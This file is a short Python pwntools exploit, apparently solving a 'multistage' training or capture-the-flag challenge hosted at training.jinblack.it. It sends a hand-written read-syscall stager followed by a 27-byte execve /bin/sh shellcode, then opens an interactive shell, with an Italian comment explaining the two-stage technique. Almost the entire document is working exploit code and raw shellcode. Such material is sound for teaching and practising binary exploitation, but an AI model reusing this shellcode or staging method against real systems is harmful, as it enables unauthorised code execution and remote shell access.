from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#p = process("./multistage")
p = remote("training.jinblack.it", 2003)
#gdb.attach(p, '''b *0x0000000000401251''')

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcodeLenght = 27

bufferAddress = 0x0404070

#READ
#xor eax, eax ; rax <- 0 (write syscall number)
#xor edi, edi ; rdi <- 0 (stdin file descriptor)
#mov rsi, buffer ; rsi <- address of the buffer
#mov edx, BUFSIZE ; rdx <- size of the buffer
#syscall ; execute

read = "\x31\xC0\x31\xFF\x48\xC7\xC6\x82\x40\x40\x00\xBA\x00\x01\x00\x00\x0F\x05"

raw_input()

p.sendline(read)
time.sleep(0.1)

p.sendline(shellcode)

p.interactive()

#Praticamente inserisco in buffer la prima read che mi permette di leggere una quantità maggiore di byte, 
#e li salvo nella posizione bufferAddress + dim(read). in questo modo dopo l'esecuzione della read 
#il programma inizia a eseguire quello che c'è dopo, cioe' la shellcode data come input alla read